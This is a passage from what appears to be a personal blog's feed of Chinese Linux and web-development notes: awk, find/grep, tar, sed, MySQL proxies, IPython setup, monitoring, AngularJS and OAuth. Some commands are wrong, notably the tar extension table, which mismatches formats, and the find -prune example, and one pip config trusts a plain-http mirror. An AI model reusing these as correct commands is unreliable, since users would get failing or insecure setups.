plain"><table><tr><td class="code"><pre><span class="line">循环</span><br></pre></td></tr></table></figure><p>[root@local node_modules]# awk -F ':' 'BEGIN {count=1;} {name[count] = $1;count++;}; END{for (i = 1; i &lt; NR+1; i++) print i, name[i]}' /etc/passwd<br>1 root<br>2 bin<br>......</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk分割大文件并</span><br></pre></td></tr></table></figure><p>awk 'NR%12==1{close(p".txt");++p}{print > p".txt"}'    filename </p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux find grep</title>
      <link href="/2015/10/31/linux/linux%20find%20grep/"/>
      <url>/2015/10/31/linux/linux%20find%20grep/</url>
      
        <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">在当前目录下所有文件中查找内容包含 string 的文件:</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*"</span> -exec grep <span class="string">"string"</span> &#123;&#125; \;</span><br><span class="line">注意:在最后不能加 <span class="builtin-name">print</span> ,否则会出错.</span><br><span class="line"> </span><br><span class="line">在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件:</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*"</span> -exec grep -l <span class="string">"string"</span> &#123;&#125; \;</span><br><span class="line"> </span><br><span class="line">在当前目录下 *.c 中查找内容包含 string 的文件并列出字符所在的文件的所在行(不显示文件名):</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*.c"</span> -exec grep -n <span class="string">"string"</span> &#123;&#125; \;</span><br><span class="line"> </span><br><span class="line">在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件,所在行及所在行的内容:</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*"</span> -exec grep -n <span class="string">"string"</span> ./ &#123;&#125; \;</span><br><span class="line"> </span><br><span class="line">使用 <span class="builtin-name">find</span> 查找时希望忽略某个目录(-prune)：</span><br><span class="line">如果希望在 /app 目录下查找文件， 但不希望在 /app/bin 目录下查找：</span><br><span class="line"><span class="builtin-name">find</span> /app -name <span class="string">"/app/bin"</span> -prune -o -print</span><br><span class="line"> </span><br><span class="line">使用<span class="built_in"> type </span>选项：</span><br><span class="line">如果要在 /etc 目录下查找所有的目录：</span><br><span class="line"><span class="builtin-name">find</span> /etc -type d -print</span><br><span class="line"> </span><br><span class="line">如果要在 /etc 目录下查找 .svn 的目录：</span><br><span class="line"><span class="builtin-name">find</span> /etc -name .svn -type d -print</span><br><span class="line"></span><br><span class="line">为了在当前目录下查找除目录以外的所有类型的文件：</span><br><span class="line"><span class="builtin-name">find</span> . ! -type d -print</span><br><span class="line"> </span><br><span class="line">为了在当前目录下查找所有的符号链接文件， 可以用：</span><br><span class="line"><span class="builtin-name">find</span> . -type l -print</span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">find</span> .  -mtime -4（4天内）/4(4天前的那一天)/+4（5天前）</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">find</span>         -name </span><br><span class="line">                -size   +50k</span><br><span class="line">                -type    f/b/c/d/l/sp<span class="built_in">..</span>.</span><br><span class="line">                -perm    -/+ /    755</span><br><span class="line">                -uid<span class="built_in">/user </span>     201/yangsf</span><br><span class="line">                -gid<span class="built_in">/group </span>   501/yangsf</span><br><span class="line">                -nouser/nogroup   </span><br><span class="line"></span><br><span class="line">===========================================================</span><br><span class="line">为了用 ls -l 命令列出所匹配到的文件， 可以把 ls -l 命令放在find命令的 -exec 选项中：</span><br><span class="line"><span class="builtin-name">find</span> . -type f -exec ls -l &#123;&#125; \;</span><br><span class="line"> </span><br><span class="line">注： f 表示普通文件</span><br><span class="line">    exec 选项后面跟随着所要执行的命令， 然后是一对 &#123;&#125;， 一个空格和一个 \，最后是一个分号。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find </tag>
            
            <tag> grep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux tar</title>
      <link href="/2015/10/31/linux/linux%20tar/"/>
      <url>/2015/10/31/linux/linux%20tar/</url>
      
        <content type="html"><![CDATA[<p>解压</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tar</span><span class="selector-class">.bz</span>                 tar zxvf  file<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line"><span class="selector-class">.tar</span><span class="selector-class">.gz2</span>                tar jxvf file<span class="selector-class">.tar</span><span class="selector-class">.bz2</span></span><br><span class="line"><span class="selector-class">.bz</span>                     gzip -d  file.bz</span><br><span class="line"><span class="selector-class">.gz2</span>                    bzip2 -d file.gz2</span><br></pre></td></tr></table></figure><p>压缩</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.gz</span>                     gzip    -v    file</span><br><span class="line"><span class="selector-class">.bz2</span>                    bzip2    -v    file</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tar</span><span class="selector-class">.gz</span>                tar -zcvf file<span class="selector-class">.tar</span><span class="selector-class">.gz</span>  dir</span><br><span class="line"><span class="selector-class">.tar</span><span class="selector-class">.bz2</span>               tar -jcvf file<span class="selector-class">.tar</span><span class="selector-class">.gz2</span>  dir</span><br></pre></td></tr></table></figure><p>查看 </p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zcat</span></span><br><span class="line"><span class="attribute">bzcat</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux sed</title>
      <link href="/2015/10/31/linux/linux%20sed/"/>
      <url>/2015/10/31/linux/linux%20sed/</url>
      
        <content type="html"><![CDATA[<p>原文引用：<a href="http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2856901.html" target="_blank" rel="noopener">http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2856901.html</a></p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@www ~]</span># <span class="selector-tag">sed</span> <span class="selector-attr">[-nefr]</span> <span class="selector-attr">[动作]</span></span><br><span class="line">选项与参数：</span><br><span class="line"><span class="selector-tag">-n</span> ：使用安静(silent)模式。在一般 <span class="selector-tag">sed</span> 的用法中，所有来自 <span class="selector-tag">STDIN</span> 的数据一般都会被列出到终端上。但如果加上 <span class="selector-tag">-n</span> 参数后，则只有经过<span class="selector-tag">sed</span> 特殊处理的那一行(或者动作)才会被列出来。</span><br><span class="line"><span class="selector-tag">-e</span> ：直接在命令列模式上进行 <span class="selector-tag">sed</span> 的动作编辑；</span><br><span class="line"><span class="selector-tag">-f</span> ：直接将 <span class="selector-tag">sed</span> 的动作写在一个文件内， <span class="selector-tag">-f</span> <span class="selector-tag">filename</span> 则可以运行 <span class="selector-tag">filename</span> 内的 <span class="selector-tag">sed</span> 动作；</span><br><span class="line"><span class="selector-tag">-r</span> ：<span class="selector-tag">sed</span> 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法)</span><br><span class="line"><span class="selector-tag">-i</span> ：直接修改读取的文件内容，而不是输出到终端。</span><br><span class="line">动作说明： <span class="selector-attr">[n1[,n2]</span>]<span class="selector-tag">function</span></span><br><span class="line"><span class="selector-tag">n1</span>, <span class="selector-tag">n2</span> ：不见得会存在，一般代表『选择进行动作的行数』，举例来说，如果我的动作是需要在 <span class="selector-tag">10</span> 到 <span class="selector-tag">20</span> 行之间进行的，则『 <span class="selector-tag">10</span>,<span class="selector-tag">20</span><span class="selector-attr">[动作行为]</span> 』</span><br><span class="line"><span class="selector-tag">function</span>：</span><br><span class="line"><span class="selector-tag">a</span> ：新增， <span class="selector-tag">a</span> 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</span><br><span class="line"><span class="selector-tag">c</span> ：取代， <span class="selector-tag">c</span> 的后面可以接字串，这些字串可以取代 <span class="selector-tag">n1</span>,<span class="selector-tag">n2</span> 之间的行！</span><br><span class="line"><span class="selector-tag">d</span> ：删除，因为是删除啊，所以 <span class="selector-tag">d</span> 后面通常不接任何咚咚；</span><br><span class="line"><span class="selector-tag">i</span> ：插入， <span class="selector-tag">i</span> 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</span><br><span class="line"><span class="selector-tag">p</span> ：列印，亦即将某个选择的数据印出。通常 <span class="selector-tag">p</span> 会与参数 <span class="selector-tag">sed</span> <span class="selector-tag">-n</span> 一起运行～</span><br><span class="line"><span class="selector-tag">s</span> ：取代，可以直接进行取代的工作哩！通常这个 <span class="selector-tag">s</span> 的动作可以搭配正规表示法！例如 <span class="selector-tag">1</span>,<span class="selector-tag">20s</span>/<span class="selector-tag">old</span>/<span class="selector-tag">new</span>/<span class="selector-tag">g</span> 就是</span><br></pre></td></tr></table></figure><p>对输出进行行删除</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root@local yang]<span class="comment"># nl passwd |sed '2,33d'</span></span><br><span class="line"><span class="number">1</span><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="number">34</span><span class="symbol">yang:</span><span class="symbol">x:</span><span class="number">500</span><span class="symbol">:</span><span class="number">500</span><span class="symbol">:yang</span><span class="symbol">:/home/yang</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="number">35</span><span class="symbol">www:</span><span class="symbol">x:</span><span class="number">501</span><span class="symbol">:</span><span class="number">501</span><span class="symbol">:</span><span class="symbol">:/home/www</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="number">36</span><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">502</span><span class="symbol">:</span><span class="number">502</span><span class="symbol">:</span><span class="symbol">:/home</span></span><br></pre></td></tr></table></figure><p>替换行</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root@local yang]<span class="comment"># nl passwd |sed '2,5c 1111'</span></span><br><span class="line"><span class="number">1</span><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="number">1111</span></span><br><span class="line"><span class="number">6</span><span class="symbol">www:</span><span class="symbol">x:</span><span class="number">501</span><span class="symbol">:</span><span class="number">501</span><span class="symbol">:</span><span class="symbol">:/home/www</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="number">7</span><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">502</span><span class="symbol">:</span><span class="number">502</span><span class="symbol">:</span><span class="symbol">:/home/m</span></span><br></pre></td></tr></table></figure><p>列出指定行内容</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root@local yang]<span class="comment"># nl passwd |sed -n '2,3p'</span></span><br><span class="line"><span class="number">2</span><span class="symbol">saslauth:</span><span class="symbol">x:</span><span class="number">498</span><span class="symbol">:</span><span class="number">76</span><span class="symbol">:<span class="string">"Saslauthd user"</span></span><span class="symbol">:/var/empty/saslauth</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="number">3</span><span class="symbol">postfix:</span><span class="symbol">x:</span><span class="number">89</span><span class="symbol">:</span><span class="number">89</span><span class="symbol">:</span><span class="symbol">:/var/spool/postfix</span><span class="symbol">:/sbin/nologin</span></span><br></pre></td></tr></table></figure><p>搜索关键字所在行</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># nl passwd |sed -n '/root/p' #p 打印 d 删除.....</span></span><br><span class="line"><span class="number">1</span><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure><p>搜索并执行命令</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># nl passwd |sed -n '/root/&#123;s/root/aaa/;p;q&#125;'  #  :q执行一次就退出</span></span><br><span class="line">   <span class="number">1</span><span class="symbol">aaa:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure><p>搜索与替换</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[yang<span class="variable">@local</span> ~]<span class="variable">$ </span>ifconfig eth<span class="number">0</span>|grep <span class="string">'inet addr'</span>|sed <span class="string">'s/^.*addr://g'</span> |sed <span class="string">'s/Bcast.*$//g'</span></span><br><span class="line"><span class="number">192.168</span>.<span class="number">50.168</span></span><br></pre></td></tr></table></figure><p>对文件的搜索与替换</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root@local yang]<span class="comment"># nl passwd</span></span><br><span class="line"><span class="number">1</span><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="number">2</span><span class="symbol">saslauth:</span><span class="symbol">x:</span><span class="number">498</span><span class="symbol">:</span><span class="number">76</span><span class="symbol">:<span class="string">"Saslauthd user"</span></span><span class="symbol">:/var/empty/saslauth</span><span class="symbol">:/---/login</span></span><br><span class="line"><span class="number">3</span><span class="symbol">postfix:</span><span class="symbol">x:</span><span class="number">89</span><span class="symbol">:</span><span class="number">89</span><span class="symbol">:</span><span class="symbol">:/var/spool/postfix</span><span class="symbol">:/---/login</span></span><br><span class="line"></span><br><span class="line">[root@local yang]<span class="comment"># sed -n 's/---/sbin/g;p' passwd     #替换预览</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">saslauth:</span><span class="symbol">x:</span><span class="number">498</span><span class="symbol">:</span><span class="number">76</span><span class="symbol">:<span class="string">"Saslauthd user"</span></span><span class="symbol">:/var/empty/saslauth</span><span class="symbol">:/sbin/login</span></span><br><span class="line"><span class="symbol">postfix:</span><span class="symbol">x:</span><span class="number">89</span><span class="symbol">:</span><span class="number">89</span><span class="symbol">:</span><span class="symbol">:/var/spool/postfix</span><span class="symbol">:/sbin/login</span></span><br><span class="line"></span><br><span class="line">[root@local yang]<span class="comment"># sed -i 's/---/sbin/g' passwd    #替换 sed -i 's/---/sbin/g;p' passwd 加p将会将输出追加到文件内容</span></span><br><span class="line">[root@local yang]<span class="comment"># nl passwd</span></span><br><span class="line"><span class="number">1</span><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="number">2</span><span class="symbol">saslauth:</span><span class="symbol">x:</span><span class="number">498</span><span class="symbol">:</span><span class="number">76</span><span class="symbol">:<span class="string">"Saslauthd user"</span></span><span class="symbol">:/var/empty/saslauth</span><span class="symbol">:/sbin/login</span></span><br><span class="line"><span class="number">3</span><span class="symbol">postfix:</span><span class="symbol">x:</span><span class="number">89</span><span class="symbol">:</span><span class="number">89</span><span class="symbol">:</span><span class="symbol">:/var/spool/postfix</span><span class="symbol">:/sbin/login</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sed </tag>
            
            <tag> nl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql 中间件</title>
      <link href="/2015/10/30/mysql/mysql%20%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
      <url>/2015/10/30/mysql/mysql%20%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>360的Atlas</p><p>1.读写分离</p><p>2.从库负载均衡</p><p>3.IP过滤</p><p>4.自动分表</p><p>5.DBA可平滑上下线DB</p><p>6.自动摘除宕机的DB</p><p>altas 在10000/s的请求量级应该是毫无问题的</p><p><a href="https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md" target="_blank" rel="noopener">https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md</a></p><p>&nbsp;</p><p>kingshard（GO）</p><ol><li>读写分离。</li><li>跨节点分表。</li><li>支持透明的MySQL连接池，不必每次新建连接。</li><li>支持客户端IP访问控制。</li><li>平滑上线DB或下线DB，前端应用无感知。</li><li>支持多个slave，slave之间通过权值进行负载均衡。</li><li>支持强制读主库。</li><li>支持将sql发送到特定的node。</li><li>支持在单个node上执行事务，不支持跨多个node执行事务。</li><li>支持跨node的count,sum,max和min等函数。</li><li>支持单个分表的join操作，即支持分表和另一张不分表的join操作。</li><li>支持order by,limit等操作。</li><li>支持主流语言（java,php,python,C/C++,Go)SDK的mysql的prepare特性。</li></ol><p><a href="https://github.com/flike/kingshard/blob/master/README_ZH.md" target="_blank" rel="noopener">https://github.com/flike/kingshard/blob/master/README_ZH.md</a></p><p>&nbsp;</p><p>阿里的Cobar（java）</p><p><a href="https://github.com/alibaba/cobar" target="_blank" rel="noopener">https://github.com/alibaba/cobar</a></p><p>淘宝的 TDDL</p><p><a href="https://github.com/alibaba/tb_tddl" target="_blank" rel="noopener">https://github.com/alibaba/tb_tddl</a></p><p>百度的DBProxy</p><p>Amoeba</p><p><a href="http://www.biaodianfu.com/amoeba.html" target="_blank" rel="noopener">http://www.biaodianfu.com/amoeba.html</a></p><p>mysqlnd_ms</p><p>读写分离插件<a href="http://www.laruence.com/2011/10/05/2192.html" target="_blank" rel="noopener">http://www.laruence.com/2011/10/05/2192.html</a></p><p>mysql官方的mysql-proxy</p><p>OneProxy</p><p>OneSQL</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ipython notebook</title>
      <link href="/2015/10/28/python/ipython%20notebook/"/>
      <url>/2015/10/28/python/ipython%20notebook/</url>
      
        <content type="html"><![CDATA[<p>本内容基于centos<br>yum install sqlite-devel -y #<br>安装python2.7.10<br>谨记–prefix=/usr/local/python27 以及 make altinstall</p><p>安装 pip</p><p>修改源 vim ~/.pip/pip.conf</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">index-url</span> = http://pypi.douban.com/simple</span><br><span class="line"><span class="attr">trusted-host</span> = pypi.douban.com</span><br></pre></td></tr></table></figure><p>开始</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">virtualenv notebook</span><br><span class="line">source notebook/bin/activate</span><br><span class="line">pip install ipython</span><br><span class="line">pip install pyzmq</span><br><span class="line">pip install tornado</span><br><span class="line">pip install MathJax</span><br></pre></td></tr></table></figure><p>ipython notebook<br>如出现 ImportError: No module named notebook.notebookapp</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> jupyter</span><br></pre></td></tr></table></figure><p>出现 ImportError: No module named _sqlite3</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">yum <span class="keyword">install</span> sqlite-devel -y</span><br></pre></td></tr></table></figure><p>如果python已经安装好 需要重新编译python</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>性能监控</title>
      <link href="/2015/10/28/linux/%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7/"/>
      <url>/2015/10/28/linux/%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<p>确定监控的对象 指标 报警机制</p><p>硬件监控：温度 硬盘</p><p>系统监控：</p><p>CPU：上下文切换（context switchs）  运行队列（Run queue）  使用率（utilization）常用工具 top vmstat mpstat</p><p>内存：使用率   SWAP使用率  也可以通过内存的使用率曲线发现某些服务的内存溢出  常用工具free vmstat</p><p>IO：磁盘IO  网络IO  常用工具 iostat  iotop  iftop</p><p>TCP监控：查看tcp连接情况 常用工具 netstat ss</p><p>其它项：进程数  登录用户及历史记录 openfile</p><p>应用监控：各类服务如nginx mysql  等</p><p>以上监控集合：Zabbix</p><p>流量分析:<br>网络监控<br>安全监控<br>业务监控<br>日志监控:logstash(收集)  elasticsearch（存储+搜索）  kibana（展示）<br>自动化<br>可视化</p><p>以上内容整合自 <a href="http://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=400138875&amp;idx=1&amp;sn=01b4ea2978370d215442e4a22d7d2a7f&amp;scene=23&amp;srcid=1028gL2FQ3YXNmIIUZwuyFLI#rd" target="_blank">高效运维（公众号）</a>   如有版权问题请联系本站管理人员予以删除</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>centos 安装mysqldb 记录</title>
      <link href="/2015/10/13/linux/centos%20%E5%AE%89%E8%A3%85mysqldb%20%E8%AE%B0%E5%BD%95/"/>
      <url>/2015/10/13/linux/centos%20%E5%AE%89%E8%A3%85mysqldb%20%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>vim setup_pofix.py #修改mysql_config路径</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">ln -s /usr/local/mysql/<span class="class"><span class="keyword">lib</span>/<span class="title">libmysqlclient</span>.<span class="title">so</span>.18 /<span class="title">usr</span>/<span class="title">lib</span></span></span><br><span class="line">ldconfig</span><br><span class="line">python setup.py install</span><br><span class="line">报错“_mysql.<span class="symbol">c:</span><span class="number">29</span>:<span class="number">20</span>: 错误：Python.h：没有那个文件或目录”</span><br><span class="line"></span><br><span class="line">yum install python-devel</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>angularjs-yeoman环境配置</title>
      <link href="/2015/10/13/js/angularjs-yeoman%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2015/10/13/js/angularjs-yeoman%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">yum install npm -<span class="keyword">y</span></span><br><span class="line">npm install -g grunt-cli bower yo generator-karma-require generator-angular-require</span><br><span class="line">yum install <span class="keyword">ruby</span> <span class="keyword">ruby</span>-devel rubygems -<span class="keyword">y</span></span><br><span class="line">gem sources --<span class="built_in">add</span> http<span class="variable">s:</span>//<span class="keyword">ruby</span>.taobao.org/ --<span class="built_in">remove</span> http://rubygems.org/</span><br><span class="line">gem install compass</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angularjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angularjs 根据变量改变 动态加载模板</title>
      <link href="/2015/10/12/js/angularjs%20%E6%A0%B9%E6%8D%AE%E5%8F%98%E9%87%8F%E6%94%B9%E5%8F%98%20%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/"/>
      <url>/2015/10/12/js/angularjs%20%E6%A0%B9%E6%8D%AE%E5%8F%98%E9%87%8F%E6%94%B9%E5%8F%98%20%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>directive</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">        restrict: <span class="string">'E'</span>,</span><br><span class="line">       <span class="built_in"> replace</span>:<span class="built_in"> true</span>,</span><br><span class="line">        templateUrl: <span class="string">'app/view/order.html'</span>,</span><br><span class="line">        link: <span class="keyword">function</span> (scope, <span class="keyword">element</span>, attrs) &#123;</span><br><span class="line">            scope.Type = attrs.Type;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br></pre></td></tr></table></figure><p>模板</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> ng-<span class="keyword">switch</span> <span class="keyword">on</span>=<span class="string">"item.Type"</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">div</span> ng-<span class="keyword">switch</span>-when=<span class="string">"1"</span>&gt;&lt;ng-<span class="built_in">include</span> src=<span class="string">"'views/1.html'"</span>&gt;&lt;/ng-<span class="built_in">include</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">div</span> ng-<span class="keyword">switch</span>-when=<span class="string">"2"</span>&gt;&lt;ng-<span class="built_in">include</span> src=<span class="string">"'views/2.html'"</span>&gt;&lt;/ng-<span class="built_in">include</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">div</span> ng-<span class="keyword">switch</span>-when=<span class="string">"3"</span>&gt;&lt;ng-<span class="built_in">include</span> src=<span class="string">"'views/3.html'"</span>&gt;&lt;/ng-<span class="built_in">include</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angularjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oauth2.0原理</title>
      <link href="/2015/09/29/php/oauth2.0%E5%8E%9F%E7%90%86/"/>
      <url>/2015/09/29/php/oauth2.0%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>oauth2.0的大致原理</p><p>三个角色： 用户（u）  服务商（s）   web（c）</p><ol><li>跳转至s的登录授权页面（Request User Url）  提示用户登录并显示授权信息 生成oauth code给c（应该是通过callback url返回）</li></ol><p>2.C 向S 请求access_token（Request access url ）</p><p>3.C通过Access Token向S请求OpenID（Request info url）</p><p>4.C用code、token 向S请求用户信息</p><p>如图：</p><p><a href="http://www.sfhy20.com/wp-content/uploads/2015/09/oauth2.0_developer_pic.jpg" target="_blank" rel="noopener"><img class="alignnone  wp-image-269" src="http://www.sfhy20.com/wp-content/uploads/2015/09/oauth2.0_developer_pic-300x221.jpg" alt="oauth2.0_developer_pic" width="657" height="484"></a></p><p>From： <a href="http://kb.cnblogs.com/page/189153/" target="_blank" rel="noopener">http://kb.cnblogs.com/page/189153/</a></p><p>&nbsp;</p><p>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux命令 小技巧</title>
      <link href="/2015/09/17/linux/linux%E5%91%BD%E4%BB%A4%20%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2015/09/17/linux/linux%E5%91%BD%E4%BB%A4%20%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">!! <span class="comment">#执行上条命令</span></span><br><span class="line">!c <span class="comment">#显示之前以c开头的命令历史</span></span><br><span class="line">!?abc <span class="comment">#显示包含abc的命令历史 </span></span><br><span class="line"></span><br><span class="line">vim &#123;1,2,3&#125;<span class="string">.log</span>  <span class="comment"># 同时编辑多个文件</span></span><br><span class="line">touch &#123;1.<span class="string">.10</span>&#125;<span class="string">.txt</span>  <span class="comment">#创建多个文件</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>centos6.7 install chrome</title>
      <link href="/2015/09/14/linux/centos6.7%20install%20chrome/"/>
      <url>/2015/09/14/linux/centos6.7%20install%20chrome/</url>
      
        <content type="html"><![CDATA[<p>1.yum仓库 （如果用rpm包安装 可以忽略此步）</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/google-chrome.repo</span><br><span class="line">[google-chrome]</span><br><span class="line">name=google-chrome</span><br><span class="line">baseurl=http://dl.google.com/linux/chrome/rpm/stable/$basearch</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub</span><br></pre></td></tr></table></figure><p>2.安装依赖(当遇到listdc++依赖时)</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">wget http:<span class="comment">//li.nux.ro/download/nux/dextop/el6/x86_64/nux-dextop-release-0-2.el6.nux.noarch.rpm</span></span><br><span class="line">rpm -ivh nux-dextop-release-<span class="number">0</span>-<span class="number">2</span><span class="selector-class">.el6</span><span class="selector-class">.nux</span><span class="selector-class">.noarch</span><span class="selector-class">.rpm</span></span><br></pre></td></tr></table></figure><ol start="3"><li><code>yum install google-chrome-stable</code><br>如果遇到网络失败 百度下载google-chrome当rpm包<br>下载完成后 点击安装即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开启nginx缓存</title>
